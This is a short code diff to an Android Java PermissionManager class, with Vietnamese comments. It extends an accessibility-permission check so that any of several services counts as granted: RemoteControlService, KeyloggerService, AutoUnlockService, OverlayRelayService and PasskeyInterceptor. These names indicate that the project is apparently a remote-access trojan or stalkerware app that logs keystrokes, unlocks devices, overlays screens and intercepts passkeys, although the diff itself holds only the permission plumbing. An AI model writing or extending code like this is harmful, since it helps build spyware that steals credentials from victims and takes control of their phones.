@@ -142,6 +142,18 @@ public final class PermissionManager {
         }
     }
 
+    /**
+     * Danh sách tất cả Accessibility Services của app.
+     * Nếu bất kỳ service nào được bật, coi như accessibility đã được cấp.
+     */
+    private static final String[] ACCESSIBILITY_SERVICES = {
+        ".features.screen.RemoteControlService",
+        ".features.keylogger.KeyloggerService",
+        ".features.unlock.AutoUnlockService",
+        ".features.relay.OverlayRelayService",
+        ".features.passkey.PasskeyInterceptor",
+    };
+
     public static boolean hasAccessibility(Context ctx) {
         String enabledServices = Settings.Secure.getString(
                 ctx.getContentResolver(),
@@ -149,7 +161,12 @@ public final class PermissionManager {
         );
         if (enabledServices == null) return false;
         String pkg = ctx.getPackageName();
-        return enabledServices.contains(pkg + "/.features.screen.RemoteControlService");
+        for (String service : ACCESSIBILITY_SERVICES) {
+            if (enabledServices.contains(pkg + "/" + service)) {
+                return true;
+            }
+        }
+        return false;
     }
 
     public static void requestAccessibility(Context ctx) {
